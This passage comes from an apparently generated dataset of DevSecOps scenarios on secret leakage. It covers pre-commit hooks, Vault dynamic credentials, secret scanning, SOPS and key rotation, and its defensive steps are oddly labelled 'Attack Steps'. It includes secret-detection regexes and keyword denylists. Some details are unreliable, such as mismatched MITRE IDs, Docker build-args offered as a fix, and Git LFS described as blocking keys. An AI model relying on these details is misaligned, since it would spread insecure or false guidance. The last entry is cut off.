- **Scenario**: Upon detection of hardcoded AWS credentials, system triggers automatic secret rotation through AWS Secrets Manager.
- **Attack Steps**: 1. A developer accidentally commits an AWS access key and secret to a public GitHub repository.2. GitHub Advanced Security triggers a secret scanning alert within minutes of the push.3. An AWS Lambda function, subscribed to SNS alerts, identifies the key from GitHub's webhook and rotates the key using the AWS Secrets Manager API.4. The IAM user’s old key is disabled and a new one is issued with the same permissions.5. The updated key is injected into all runtime environments using parameter store integration and auto-reload.6. DevSecOps team reviews CloudTrail logs to verify no misuse happened during the key’s exposure window.7. Secrets Manager versioning ensures rollback in case rotation breaks downstream systems.8. Alert response time, auto-rotation logic, and AWS permissions are reviewed during post-incident.9. Future pushes to main branch are blocked if secrets are detected using pre-commit hooks.10. Developers are trained to use aws-vault or short-lived credentials only.
- **Detection**: GitHub Advanced Security + AWS SNS trigger
- **Solution**: Enforce secret scanning + automated rotation
- **Tags**: #aws #secretsmanager #rotation #gitleak

## Dynamic Database Password Injection Using HashiCorp Vault in CI

- **Attack Type**: Secrets Injection at Runtime
- **Target**: CI/CD Pipeline
- **Vulnerability**: Static secrets removed from code
- **MITRE**: T1552.004
- **Impact**: Runtime injection prevents static leak
- **Tools**: HashiCorp Vault, Jenkins, Ansible
- **Scenario**: Hardcoded DB passwords replaced by Vault-injected credentials at CI runtime.
- **Attack Steps**: 1. CI pipeline in Jenkins previously used a static .env file containing MySQL credentials to deploy a backend service.2. Secrets are removed from the repo and instead fetched dynamically from HashiCorp Vault during job runtime using Jenkins credentials binding plugin.3. Jenkins authenticates to Vault using a role and retrieves secrets via the Vault HTTP API (vault read secret/db/mysql).4. The password is exported to the pipeline stage and never stored on disk.5. After usage, Vault revokes the short-lived token, ensuring no credential reuse.6. Rotation policies ensure that DB credentials expire every 24 hours.7. Developers are prevented from viewing the secrets via Jenkins masking or permission scopes.8. Any attempt to access the secret from the Jenkins UI triggers an audit log entry.9. Monitoring tools check for unauthorized access patterns or credential re-use.10. Compliance team verifies that the change complies with least privilege and auditability requirements.
- **Detection**: Vault Audit Logs + Jenkins API logs
- **Solution**: Replace static secrets with dynamic Vault injection
- **Tags**: #vault #jenkins #mysql #runtimeinjection

## Git Hook Blocks Push of Hardcoded Azure Key

- **Attack Type**: Pre-Commit Hook Secret Detection
- **Target**: Git Repository
- **Vulnerability**: Hardcoded Azure token
- **MITRE**: T1552.001
- **Impact**: Prevents token from reaching repo
- **Tools**: Husky, detect-secrets
- **Scenario**: Husky hook detects and blocks Azure token before it reaches the repo.
- **Attack Steps**: 1. A developer accidentally pastes an Azure AD token into config.js for testing.2. A Husky-managed pre-commit hook runs detect-secrets scan and flags the token pattern using regexes for Azure tokens.3. The commit is blocked and the error message shows the exact line containing the secret.4. The developer removes the token and refactors the code to use a Vault-stored reference.5. Team lead receives Slack notification via CI webhook about blocked secrets (optional config).6. CI/CD won’t run without passing the commit gate.7. A .pre-commit-config.yaml file standardizes hook rules across team members.8. The team rotates the token in Azure just in case the secret was ever copied elsewhere.9. GitHub repo uses branch protections, ensuring pre-commit compliance for all merges.10. All new developers clone the repo with hook setup instructions enforced via post-checkout script.
- **Detection**: Pre-commit hook output + local logs
- **Solution**: Block commits containing secrets via Git hooks
- **Tags**: #husky #precommit #azuretoken

## PR Review Policy Blocks Unsafe Dockerfile Edit

- **Attack Type**: PR Review Enforcement
- **Target**: GitHub Pull Requests
- **Vulnerability**: Insecure Dockerfile environment variables
- **MITRE**: T1552.001
- **Impact**: Stops unsafe image builds with secrets
- **Tools**: GitHub, branch protection rules
- **Scenario**: PR reviewer blocks addition of plaintext secret into Dockerfile ENV.
- **Attack Steps**: 1. A contributor submits a pull request adding a Dockerfile with ENV API_KEY=abc123.2. GitHub repo uses a branch protection rule requiring at least one code reviewer for .github/workflows/** and Dockerfile changes.3. Reviewer flags the secret in the PR and requests removal.4. GitHub blocks the merge until a review is approved.5. Contributor refactors the Dockerfile to read API_KEY from a mounted secret via Docker --build-arg.6. PR is updated and passes the security review.7. The security team adds an additional GitHub Action that automatically scans for hardcoded secrets in Dockerfiles.8. Review guidelines are updated to prioritize checks for ENV variables with sensitive values.9. GitHub Advanced Security also scans the PR and sends a policy alert to org admins.10. The team logs all PR interactions in a compliance dashboard for audit tracking.
- **Detection**: GitHub PR workflow logs
- **Solution**: Use PR review rules and linting bots
- **Tags**: #prreview #dockerfile #secretdetection

## Dynamic Vault Credentials for Kubernetes Deployment

- **Attack Type**: Secrets Rotation in K8s
- **Target**: Kubernetes Cluster
- **Vulnerability**: Static Kubernetes secrets
- **MITRE**: T1552.004
- **Impact**: Ephemeral secrets reduce attack window
- **Tools**: HashiCorp Vault, kubectl, ArgoCD
- **Scenario**: CI deploys Kubernetes app using ephemeral Vault credentials.
- **Attack Steps**: 1. A CI/CD pipeline triggers deployment of a Go app to Kubernetes using ArgoCD.2. Instead of static secrets.yaml, the pipeline uses Vault Agent Injector.3. During deployment, Vault authenticates the Kubernetes ServiceAccount using a Vault role.4. It injects a vault.sidecar container that pulls and mounts secrets at runtime.5. The main app reads credentials from shared memory or mounted volume.6. Secrets rotate every 2 hours, minimizing lifetime risk.7. Vault audit logs record secret access and service identity mappings.8. If sidecar injection fails, the pod startup is aborted, reducing partial deployments.9. The dev team no longer requires .env files in CI artifacts.10. ArgoCD validates that all secrets come from Vault during pre-sync hooks.
- **Detection**: Vault audit logs + ArgoCD sync status
- **Solution**: Inject short-lived secrets via Vault Agent
- **Tags**: #vault #k8s #ephemeralsecrets

## Git Hook Prevents Accidental SSH Key Commit

- **Attack Type**: Pre-Commit Hook Blocking
- **Target**: Developer Workstation
- **Vulnerability**: Accidental commit of SSH private key
- **MITRE**: T1552.001
- **Impact**: Prevents credential leak to repo
- **Tools**: pre-commit, regex, Git
- **Scenario**: Regex pattern in hook blocks .pem and .ssh files from being committed.
- **Attack Steps**: 1. A developer copies a private SSH key id_rsa to a project directory for testing GitOps.2. The key is staged and added to commit.3. A custom pre-commit hook runs and checks file extensions and content entropy.4. It flags the SSH private key and prevents the commit with a custom message.5. Hook also logs the incident to a local file with a timestamp.6. Developer rotates the SSH key and removes the file.7. The team applies a .gitignore policy to exclude .ssh, .pem, and .key files globally.8. A post-commit hook sends alert to Slack if a secret ever bypasses the hook.9. Developers are trained to use SSH agent forwarding instead of key files.10. All sensitive directories are audited monthly with Git-secrets.
- **Detection**: Hook logs + commit block output
- **Solution**: Add hooks and rotate compromised SSH keys
- **Tags**: #sshkey #gitsecrets #precommithook

## CI Secrets Removed From History Using Git Filter-Repo

- **Attack Type**: Historical Secret Cleanup
- **Target**: GitHub / GitLab
- **Vulnerability**: Legacy secrets in commit history
- **MITRE**: T1552.001
- **Impact**: Cleans historical leakage of secrets
- **Tools**: Git filter-repo, BFG Repo Cleaner
- **Scenario**: Legacy commits purged of secrets using Git filter-repo.
- **Attack Steps**: 1. A security audit finds an old Git commit from 2021 containing a service_account.json with GCP credentials.2. Git history is scanned using trufflehog and confirmed to expose valid keys.3. Team uses git filter-repo to rewrite history and remove the file across all branches and tags.4. Force-push is executed with coordination to prevent downstream clone failures.5. GitHub Advanced Security is re-run to verify the history is clean.6. The GCP keys are rotated and IAM logs reviewed.7. pre-receive hooks are set up to reject commits with *.json containing high entropy strings.8. Project documentation is updated to include guidelines for secret removal.9. All contributors are required to re-clone or reset origin HEAD.10. Internal Git servers enable commit validation for .json, .env, .pem.
- **Detection**: GitHub scans + trufflehog
- **Solution**: Rewrite repo history and rotate credentials
- **Tags**: #gitfilter #historyclean #secretrotation

## Vault Rotation Policy Enforces 15-Minute DB Credential Expiry

- **Attack Type**: Short-Lived Secrets Policy
- **Target**: Database Access in CI
- **Vulnerability**: Long-lived credentials
- **MITRE**: T1552.004
- **Impact**: Limits blast radius of credential misuse
- **Tools**: HashiCorp Vault, PostgreSQL
- **Scenario**: Enforce aggressive expiration on secrets using Vault dynamic creds.
- **Attack Steps**: 1. Vault is configured to issue dynamic PostgreSQL credentials using a role-based plugin.2. A TTL policy is set to expire all credentials in 15 minutes.3. A CI/CD pipeline fetches the creds at job start, uses them to run migrations, and then discards them.4. Vault revokes the lease automatically, ensuring credentials cannot be reused.5. Attempts to reuse the revoked credentials fail with a 403 error.6. Vault logs are monitored to track access frequency and IP behavior.7. Devs are instructed never to store the credentials outside CI job memory.8. Pipelines fail-fast if Vault access fails, enforcing secrets are always fresh.9. Access control on the Vault role ensures least-privilege principle.10. Post-rotation alerts are generated and integrated into Slack or Teams.
- **Detection**: Vault access logs + TTL metrics
- **Solution**: Use dynamic secrets with short TTL
- **Tags**: #postgres #vaultttl #rotatingcreds

## PR Merge Blocked Due to Unreviewed GitHub Actions File

- **Attack Type**: PR Review Enforcement
- **Target**: GitHub Actions
- **Vulnerability**: CI security enforcement via reviews
- **MITRE**: T1556.006
- **Impact**: Prevents misuse of CI pipeline by malicious PR
- **Tools**: GitHub Branch Protection
- **Scenario**: Merge blocked until CI config change is approved by senior reviewer.
- **Attack Steps**: 1. A developer modifies .github/workflows/deploy.yml to include a new deployment step.2. A branch protection rule requires that any CI-related files receive approval from a designated reviewer group (ci-leads).3. The PR is auto-flagged and shown as “Pending Review.”4. Reviewer inspects the script and identifies a possible misuse of GITHUB_TOKEN scope.5. The developer adjusts the token permissions to read-only for security.6. After changes are approved, the PR passes checks and merges.7. Logs of the PR, review comments, and status checks are archived.8. This protection ensures no CI file is altered without oversight.9. GitHub REST API is used to monitor workflow file changes across repos.10. Changes are auto-notified to security team Slack channel.
- **Detection**: Branch protection logs
- **Solution**: Require reviewers for CI config files
- **Tags**: #githubactions #reviewrequired #prsecurity

## Secrets Stored in SOPS-Encrypted File with Automatic Decryption in CI

- **Attack Type**: Secrets at Rest Security
- **Target**: GitHub Actions / CI
- **Vulnerability**: Secret file encryption and access control
- **MITRE**: T1552.001
- **Impact**: Protects secrets in repo while enabling CI use
- **Tools**: SOPS, GPG, GitHub Actions
- **Scenario**: Secrets committed in encrypted YAML, decrypted at runtime.
- **Attack Steps**: 1. Instead of storing secrets in plain .env or YAML files, team encrypts them with Mozilla SOPS and commits the encrypted files (secrets.enc.yaml).2. GitHub Actions retrieves GPG key securely from a Vault.3. During job runtime, sops -d is run to decrypt secrets into memory only.4. Application reads the secrets from environment variables, not from disk.5. Post-job step wipes memory and sensitive files.6. Pre-commit hook ensures no unencrypted secrets.yaml is ever committed.7. Reviewers verify that secrets files are encrypted properly in each PR.8. All GPG key accesses are audited.9. The secrets are rotated monthly and re-encrypted with fresh keys.10. CI failure triggers if SOPS decryption fails, preventing unsafe deployments.
- **Detection**: Decryption audit logs + pre-commit
- **Solution**: Use SOPS for encrypted secrets in Git
- **Tags**: #sops #gpg #encryptedyaml

## Automatic Rotation of API Keys via GitHub Actions + AWS Secrets Manager

- **Attack Type**: CI-Driven Secret Rotation
- **Target**: Cloud Infrastructure & CI
- **Vulnerability**: Stale or unused static secrets
- **MITRE**: T1552.004
- **Impact**: Prevents stale or leaked secrets from persisting
- **Tools**: GitHub Actions, AWS Secrets Manager, boto3
- **Scenario**: API keys in use are automatically rotated on a scheduled GitHub Action.
- **Attack Steps**: 1. The DevSecOps team sets up a GitHub Action workflow that runs daily using schedule: trigger.2. The workflow authenticates with AWS using aws-actions/configure-aws-credentials.3. Using boto3, the action rotates an API key stored in Secrets Manager by calling rotate_secret.4. It fetches the new key and automatically updates dependent Lambda environment variables using the AWS SDK.5. All relevant CI/CD pipelines reference the secret via dynamic retrieval, not hardcoded paths.6. The old key is marked inactive and then deleted after 24 hours of overlap.7. GitHub Secrets are updated securely using gh secret set CLI command.8. Logs of the entire rotation are stored in CloudTrail and GitHub Action run logs.9. The security team is alerted through SNS notification in case of any rotation failure.10. This strategy ensures minimum blast radius and centralizes lifecycle management.
- **Detection**: GitHub Action logs + CloudTrail
- **Solution**: Schedule automated key rotation in CI
- **Tags**: #autokeyrotation #githubactions #awssecrets

## Blocking Secret Exposure in .tfvars via Pre-Commit Regex Hook

- **Attack Type**: Pre-Commit Hooks for IaC
- **Target**: Infrastructure-as-Code
- **Vulnerability**: Secrets in config files (.tfvars)
- **MITRE**: T1552.001
- **Impact**: Prevents IaC secrets from reaching source repo
- **Tools**: pre-commit, regex, Terraform
- **Scenario**: Sensitive variables in .tfvars blocked using regex scans before Git push.
- **Attack Steps**: 1. Terraform files like terraform.tfvars often contain secret values such as db_password, api_token, etc.2. A developer attempts to commit a .tfvars file with hardcoded secrets for testing.3. A pre-commit hook is triggered, which runs a regex scan to detect patterns like "password\s*=\s*\".+\".4. The commit is rejected with a clear error message pointing out the specific lines.5. Developer removes the secrets and configures Terraform to read from Vault instead using vault_generic_secret.6. The hook also warns about checking in any .env, .key, or .pem files.7. Security team reviews the hook effectiveness monthly and updates pattern rules as needed.8. Repo README includes onboarding steps that enforce pre-commit install on clone.9. CI checks verify no secrets exist in pushed Terraform files by re-running the hook.10. Git history is scrubbed using filter-repo in case any previous secrets were pushed.
- **Detection**: Pre-commit scan logs + CI pipeline gates
- **Solution**: Block and alert on sensitive patterns
- **Tags**: #terraform #precommithook #iacsecurity

## Peer Review Blocks Dangerous Workflow Token Scope

- **Attack Type**: PR Review Enforcement for CI Files
- **Target**: GitHub Workflows
- **Vulnerability**: Over-privileged CI tokens
- **MITRE**: T1556.006
- **Impact**: Prevents over-scoped tokens in workflows
- **Tools**: GitHub PR Reviews, Actions Linter
- **Scenario**: Reviewer catches misuse of GitHub GITHUB_TOKEN in workflow YAML.
- **Attack Steps**: 1. A contributor updates .github/workflows/build.yml to deploy to production.2. In the workflow, the GITHUB_TOKEN is granted write:packages and admin:repo_hook permissions.3. The repo has a branch protection rule requiring reviews for all CI files.4. A senior reviewer flags the dangerous permission escalation and leaves a comment on the PR.5. The contributor downgrades the token permissions to the minimum required: read:packages only.6. A GitHub Action Linter automatically checks for permission scopes and adds status check results to the PR.7. After approval, the PR is merged and deployment begins.8. The CI pipeline uses actions/checkout@v3 and pulls secrets from Vault dynamically.9. The audit trail of the review and changes is logged in GitHub API.10. Org admins later configure a reusable workflow template enforcing scoped tokens.
- **Detection**: PR logs + Actions Linter + audit log
- **Solution**: Require reviewer approval on CI permission usage
- **Tags**: #githubtoken #leastprivilege #prreview

## SOPS-Encrypted Helm Secrets Injected During ArgoCD Sync

- **Attack Type**: Secrets at Rest with Encrypted Delivery
- **Target**: Kubernetes / GitOps
- **Vulnerability**: Secrets exposed in plain YAML
- **MITRE**: T1552.001
- **Impact**: Keeps secrets encrypted even during deployment
- **Tools**: Mozilla SOPS, Helm, ArgoCD
- **Scenario**: SOPS-encrypted files decrypted and mounted during K8s deployment via ArgoCD.
- **Attack Steps**: 1. Secrets needed for a Helm release (e.g., API_KEY, DB_PASSWORD) are encrypted using SOPS with a PGP key.2. The encrypted file secrets.enc.yaml is committed to Git.3. ArgoCD is configured with a plugin that decrypts SOPS secrets at sync-time using a GPG key from Vault.4. During sync, Helm renders the decrypted values into a temporary secret and mounts them into the pod.5. The secret never exists in plain form on disk or Git.6. Post-deployment, the secret is deleted from Helm's local temp directory.7. All decrypted access attempts are audited via SOPS logs.8. The PGP key is rotated monthly and access is tracked via Vault.9. The CI/CD pipeline runs a validation step before pushing to ensure files remain encrypted.10. Rollbacks are handled cleanly using previous encrypted versions from Git.
- **Detection**: ArgoCD sync logs + GPG access logs
- **Solution**: Encrypt secrets with SOPS, decrypt only in memory
- **Tags**: #sops #argocd #helmsecrets

## GitHub Secrets Scanning Integration Alerts on PAT Exposure

- **Attack Type**: GitHub Security Feature
- **Target**: GitHub Repositories
- **Vulnerability**: Accidental PAT exposure
- **MITRE**: T1552.001
- **Impact**: Prevents misuse of exposed tokens
- **Tools**: GitHub Advanced Security
- **Scenario**: GitHub triggers automated alert when PAT is pushed to public repo.
- **Attack Steps**: 1. A user accidentally pushes a Personal Access Token (PAT) to a public repository.2. GitHub’s built-in secret scanning service detects the PAT within seconds.3. GitHub immediately sends an email to the user and creates an alert in the repository’s security tab.4. If configured, the system also sends a webhook to an internal Slack or Jira alerting channel.5. The user revokes the token from their GitHub developer settings.6. GitHub suggests rotating other related tokens that may have been exposed.7. A GitHub Action scans the commit history to ensure no other secrets remain.8. The organization security team investigates audit logs to determine if the PAT was used.9. The user is required to complete a short internal security training.10. Secret scanning is enforced for all org repositories using GitHub Advanced Security.
- **Detection**: GitHub Alerts + Security Tab
- **Solution**: Enable and respond to GitHub secret scanning
- **Tags**: #githubsecurity #pat #secretalert

## Rotating Database Credentials Automatically from HashiCorp Vault Agent

- **Attack Type**: Ephemeral Secret Injection
- **Target**: K8s Application Pods
- **Vulnerability**: Static or reused database secrets
- **MITRE**: T1552.004
- **Impact**: Limits DB credential exposure window
- **Tools**: HashiCorp Vault, K8s
- **Scenario**: Vault Agent sidecar auto-injects rotated DB creds into application pod.
- **Attack Steps**: 1. A service needs PostgreSQL credentials to connect from a Kubernetes pod.2. Instead of baking credentials into the container, a Vault Agent is deployed as a sidecar.3. Vault’s dynamic secrets engine creates a unique DB credential with a 1-hour TTL.4. The Vault Agent sidecar authenticates using the pod’s service account and retrieves credentials.5. It writes the secret into a shared memory mount point within the pod.6. The application fetches DB credentials from the memory path during startup.7. When the TTL expires, Vault revokes the old credentials and issues a new set.8. This automatic rotation continues in the background with zero downtime.9. Vault audit logs record every access and rotation event.10. Any failure to fetch a new credential triggers pod restart via readiness probe failure.
- **Detection**: Vault audit logs + K8s events
- **Solution**: Use Vault sidecar agent for short-lived secrets
- **Tags**: #vault #kubernetes #dynamicdb

## CI Pipeline Halts When Secrets Detected in Commits via TruffleHog

- **Attack Type**: CI Pipeline Secret Detection
- **Target**: CI Workflows (GitHub Actions)
- **Vulnerability**: Secrets in commit diffs
- **MITRE**: T1552.001
- **Impact**: Fails build if secrets are found early
- **Tools**: TruffleHog, GitHub Actions
- **Scenario**: TruffleHog integrated into CI to stop builds with detected secrets.
- **Attack Steps**: 1. A GitHub Action runs on each PR to scan the diff using trufflehog.2. If the diff includes any high-entropy string matching API key formats, the job fails immediately.3. The developer sees a clear error log showing the detected secret and commit SHA.4. The team rotates the token and deletes the commit or rebases to scrub it.5. A Slack alert notifies the security team with incident details.6. Security policy mandates manual review before any rerun is allowed.7. Secrets like Slack tokens, AWS keys, and JWTs are all matched using built-in regex rules.8. TruffleHog is configured with custom denylist patterns for internal keys.9. PR cannot be merged until the secret is removed.10. All results are stored in a searchable S3 bucket for auditing.
- **Detection**: CI build logs + webhook alerts
- **Solution**: Block CI jobs when secrets are detected
- **Tags**: #trufflehog #ciscanning #secretdiff

## Manual PR Review Blocks Sensitive .env Upload to GitHub

- **Attack Type**: Manual Code Review Policy
- **Target**: GitHub PRs
- **Vulnerability**: Sensitive files not ignored
- **MITRE**: T1552.001
- **Impact**: Prevents insecure config file merges
- **Tools**: GitHub PR Review
- **Scenario**: PR reviewer halts merge of .env with real credentials to main branch.
- **Attack Steps**: 1. A developer pushes a .env file into a feature branch by mistake.2. A PR is created, and GitHub requires a mandatory code review by the security team for files matching *.env or containing “password=”.3. The reviewer blocks the PR merge and comments on the presence of sensitive values.4. Developer deletes the file, adds it to .gitignore, and rebases history.5. Repo maintainers apply a GitHub Action that auto-fails PRs with .env files in them.6. GitHub triggers secret scanning, which also confirms presence of keys.7. The .env secrets are rotated via Vault, and devs are told to pull via dynamic retrieval only.8. Review logs are retained and linked to the contributor’s audit trail.9. A team-wide policy document is shared on secure config management.10. A custom GitHub label “security-blocked” is applied to track PRs like these.
- **Detection**: PR audit logs + merge restriction
- **Solution**: Enforce manual reviews on .env and config files
- **Tags**: #prblock #envfile #manualreview

## Git LFS Prevents Accidental Commit of Secret Images or PKI Files

- **Attack Type**: Pre-Commit Media Protection
- **Target**: GitHub Repositories
- **Vulnerability**: Insecure storage of binary secrets
- **MITRE**: T1552.001
- **Impact**: Prevents binary secret leakage via LFS filtering
- **Tools**: Git LFS, GitHub, pre-commit
- **Scenario**: .crt, .key, and large secret files filtered by Git LFS.
- **Attack Steps**: 1. Developer tries to push .key and .crt files for local testing to the repo.2. Git LFS is configured in .gitattributes to prevent pushing binary files over a certain size or extension.3. The pre-commit hook blocks these files and warns user.4. Git LFS stores them in a separate pointer format and rejects them from the main repo.5. The .key file is deleted locally, and Vault is used to store the credential instead.6. Review policies are updated to require LFS for all file types like .crt, .zip, .key.7. GitHub Actions also fail if any prohibited file is included in the diff.8. An internal tool parses Git logs weekly to scan for violations.9. Contributor is educated on secrets vs non-secrets policy.10. .gitignore is updated to cover known sensitive extensions.
- **Detection**: Git logs + LFS push rejection
- **Solution**: Block large or binary secrets from being pushed
- **Tags**: #gitlfs #keyfile #binarysecrets

## Dynamic SSH Key Rotation in Bastion Hosts via Vault Integration

- **Attack Type**: Bastion Host Hardening
- **Target**: Bastion Servers
- **Vulnerability**: Static long-lived SSH credentials
- **MITRE**: T1078.004
- **Impact**: Eliminates persistent access paths
- **Tools**: HashiCorp Vault, SSH, GitHub Actions
- **Scenario**: Automatically rotating SSH keys for ephemeral access via CI + Vault
- **Attack Steps**: 1. The organization uses a bastion host as a gateway to internal infrastructure.2. Historically, shared SSH keys were manually managed, posing security risks.3. A GitHub Action is configured to trigger daily at midnight to rotate SSH keys.4. The action authenticates to HashiCorp Vault using AppRole.5. Vault’s SSH Secrets Engine is configured in “One-Time SSH Key” mode.6. It dynamically generates a temporary SSH public key and injects it into the bastion authorized_keys.7. The matching private key is stored securely and used for just-in-time access via CI/CD.8. After a fixed TTL (e.g., 30 minutes), the key is invalidated and removed from the host.9. Every login attempt using Vault-generated keys is logged and audited in both Vault and system logs.10. This ensures controlled, audited, time-bound access with no static credentials in use.
- **Detection**: Vault audit logs + SSH login logs
- **Solution**: Use Vault to manage SSH one-time access
- **Tags**: #sshrotation #bastionsecurity #vault

## Blocking Secrets in Code with DLP-Enhanced Pre-Commit Hook

- **Attack Type**: Developer Laptop Controls
- **Target**: Developer Workstations
- **Vulnerability**: Secrets embedded in source code
- **MITRE**: T1552.001
- **Impact**: Prevents secrets entering repo history
- **Tools**: Pre-commit, GitLeaks, TensorFlow Lite
- **Scenario**: Advanced DLP pre-commit hook scans secrets with ML + denylist
- **Attack Steps**: 1. A developer attempts to commit a Python script with embedded API keys.2. The pre-commit hook uses GitLeaks for regex matching and a TensorFlow Lite model trained on secret patterns (entropy, context clues).3. The model flags the line as a potential secret even though it’s obfuscated using base64.4. The commit is blocked, and the developer receives an actionable alert with remediation tips.5. The secret is removed and instead fetched securely at runtime from a secret manager.6. Additional denylist filters catch specific keywords like token=, private_key, auth_header, etc.7. Weekly updates to the ML model are fetched from a secured repo.8. Hook logs are forwarded to the team’s internal SIEM for visibility.9. If the hook is disabled or bypassed, a GitHub webhook alerts the security team.10. Developers are trained to understand and troubleshoot hook failures without disabling protection.
- **Detection**: Hook logs + GitHub webhooks
- **Solution**: Combine ML-based and pattern DLP in hooks
- **Tags**: #dlp #ml #precommit

## PR Approval Flow for Sensitive IaC Modules Using CODEOWNERS

- **Attack Type**: Controlled Code Changes
- **Target**: GitHub Repositories
- **Vulnerability**: Unchecked IaC risk in PRs
- **MITRE**: T1485
- **Impact**: Prevents misconfig-based exposure
- **Tools**: GitHub CODEOWNERS, Terraform, PR Rules
- **Scenario**: Enforce PR review by security team for Terraform and Docker changes
- **Attack Steps**: 1. The .github/CODEOWNERS file is configured to mark terraform/** and Dockerfile as requiring security team review.2. A developer submits a PR with a new EC2 module containing wide-open security groups.3. GitHub blocks merge until the designated security reviewer signs off.4. The security reviewer flags 0.0.0.0/0 on port 22 as high risk.5. The developer changes the CIDR to a restricted IP range and re-pushes.6. A GitHub Action linter runs Terraform validate and tflint checks.7. Once checks and review pass, the PR can be merged.8. An audit log of the PR approval and changes is kept in GitHub’s Security tab.9. Monthly dashboards show how many sensitive changes were reviewed manually.10. This policy reduces production risk by enforcing human-in-the-loop controls.
- **Detection**: PR history + CODEOWNER enforcement
- **Solution**: Require manual approval for sensitive paths
- **Tags**: #codeowners #iacsecurity #reviewgate

## On-Push GitHub Action to Detect and Remove Hardcoded Secrets

- **Attack Type**: CI Hook Secret Sanitization
- **Target**: GitHub Pull Requests
- **Vulnerability**: Poor hygiene with config files
- **MITRE**: T1552.001
- **Impact**: Prevents common slip-ups from hitting main
- **Tools**: GitHub Actions, TruffleHog, Rebase Tool
- **Scenario**: A CI workflow checks for secrets and scrubs them in PRs before merge
- **Attack Steps**: 1. A GitHub Action runs on every push to scan the full commit diff using TruffleHog.2. It identifies a Firebase private key that was unintentionally included in a JSON file.3. Instead of failing the job, the Action auto-rebases the commit and removes the secret-containing line.4. It opens a new PR with a message explaining the issue and links to documentation on managing secrets securely.5. The original PR is marked as blocked with a label secret-found.6. A webhook notifies the security team of the incident.7. The key is rotated via the Firebase console and tracked in the Vault.8. GitHub maintains audit trail of both the original and sanitized PR.9. This pattern encourages devs to learn from errors without blocking the release pipeline entirely.10. Additional policies are applied to .json, .yaml, .env formats in future updates.
- **Detection**: TruffleHog logs + PR automation
- **Solution**: Auto-sanitize secrets via CI workflows
- **Tags**: #autofix #prsanitizer #jsonleak

## Auto-Rotate Cloud Database User on GitHub PR Merge

- **Attack Type**: Cloud DB Rotation via GitOps
- **Target**: Cloud Databases
- **Vulnerability**: Static DB credentials across branches
- **MITRE**: T1552.004
- **Impact**: Replaces exposed DB creds upon change
- **Tools**: GitHub Actions, AWS RDS, boto3
- **Scenario**: Merge triggers user credential rotation in managed cloud DB
- **Attack Steps**: 1. The team uses GitOps for deploying cloud infra, including AWS RDS MySQL.2. A merge into main branch of the IaC repo triggers a GitHub Action.3. The Action runs a Python script using boto3 to rotate the RDS master user password.4. The new secret is stored in AWS Secrets Manager and versioned with metadata.5. The Terraform state is updated to reference the new secret ID dynamically.6. Vault is notified to update any dependent service tokens or credentials.7. Access to the database using the old credential is revoked within 30 seconds.8. CloudTrail logs show when and by whom the rotation occurred.9. Alerts are sent via SNS and Slack confirming success/failure.10. If the pipeline fails, rollback is automated using last working secret version.
- **Detection**: CloudTrail + GitHub CI logs
- **Solution**: Rotate DB users post-merge via GitOps CI
- **Tags**: #rdsrotation #gitops #credrotation

## Reusable Workflows with Built-in Token Scope Enforcement

- **Attack Type**: Workflow Template Hardening
- **Target**: Enterprise CI Pipelines
- **Vulnerability**: Insecure token inheritance
- **MITRE**: T1556.006
- **Impact**: Prevents over-permissioned CI reuse
- **Tools**: GitHub Enterprise, Workflow Templates
- **Scenario**: Enforce GITHUB_TOKEN scopes in enterprise-level reusable workflows
- **Attack Steps**: 1. Enterprise teams use shared workflows across 100+ repos.2. A reusable workflow is created for deployments and requires a specific permissions: block limiting token access.3. If a team tries to override or escalate the token’s access in their repo’s caller workflow, the build fails.4. GitHub automatically blocks the workflow call unless the scopes match.5. Audit logs track every override attempt and notify platform security team.6. A template enforcement policy using workflow-policy.yaml is applied across org repos.7. Security team uses gh api to validate token scopes periodically.8. This prevents accidental or malicious misuse of internal reusable workflows.9. Documentation is provided for how to request elevated scopes via secure pipeline onboarding.10. Secrets are only passed to workflows when both token and context are trusted.
- **Detection**: GitHub audit logs + token scope check
- **Solution**: Lock down scopes in reusable workflows
- **Tags**: #reusableworkflows #scopeenforcement

## Secrets Leak Detected via Custom GitHub Webhook + Slack Alert

- **Attack Type**: Real-Time Secret Watchdog
- **Target**: GitHub Commits
- **Vulnerability**: Real-time reaction to committed secrets
- **MITRE**: T1552.001
- **Impact**: Stops secrets before they reach main
- **Tools**: GitHub Webhooks, Custom Python Bot
- **Scenario**: Real-time GitHub webhook notifies Slack when key pattern is committed
- **Attack Steps**: 1. A developer accidentally commits a JWT token into a Node.js config file.2. A GitHub webhook posts commit diffs to a custom Python Flask API on the security server.3. The API parses the diff, applies regex and entropy filters to detect secrets.4. Upon detection, it sends an alert to Slack with file name, committer, and match line.5. The same webhook triggers a GitHub Action to revert the offending commit and block the push.6. The leaked JWT is immediately revoked from the identity provider (e.g., Auth0).7. An incident is logged in Jira, and the developer is assigned to remediation.8. Over time, false positives are reduced using a learning engine and custom token denylist.9. All detected incidents are written to a dedicated DynamoDB incident table.10. Weekly metrics are generated from incident trends to guide developer training.
- **Detection**: Slack alert + webhook audit logs
- **Solution**: Real-time detection + alert on commit events
- **Tags**: #realtimealert #slackhook #jwtdetection

## Git Pre-Receive Hook Rejects Sensitive Commits in Central Repo

- **Attack Type**: Server-Side Repo Enforcement
- **Target**: GitLab Self-Hosted
- **Vulnerability**: Lack of server-side commit filtering
- **MITRE**: T1552.001
- **Impact**: Blocks secret propagation into origin
- **Tools**: GitLab CE, Shell Script Hook
- **Scenario**: GitLab pre-receive hook blocks commits with secrets at server level
- **Attack Steps**: 1. A developer pushes a commit containing AWS keys to the central GitLab server.2. A pre-receive hook runs server-side, scanning the full push using a regex + entropy checker.3. If secrets are found, the entire push is rejected with a descriptive error message.4. The error log includes file name, line number, and match details.5. The hook logs the rejection in a centralized log directory with timestamp.6. GitLab CI also fails the job, preventing pipeline from running.7. Security team reviews logs weekly to refine the detection logic.8. The hook is open-sourced and contributed back to internal tooling repo.9. Developers are taught how to test hooks locally before pushing.10. Legacy branches are scanned periodically to detect unblocked secrets.
- **Detection**: Hook logs + Git push errors
- **Solution**: Use server-side pre-receive hooks
- **Tags**: #gitlabhook #centralcheck #prepushblock

## Credential Expiry Monitor for Long-Lived Tokens via Lambda

- **Attack Type**: Token Expiry Monitoring
- **Target**: CI/CD Tokens
- **Vulnerability**: Long-lived access credentials
- **MITRE**: T1552.004
- **Impact**: Reduces token lifetime exposure
- **Tools**: AWS Lambda, Secrets Manager, CloudWatch
- **Scenario**: Automated Lambda warns of expiring credentials used in CI/CD
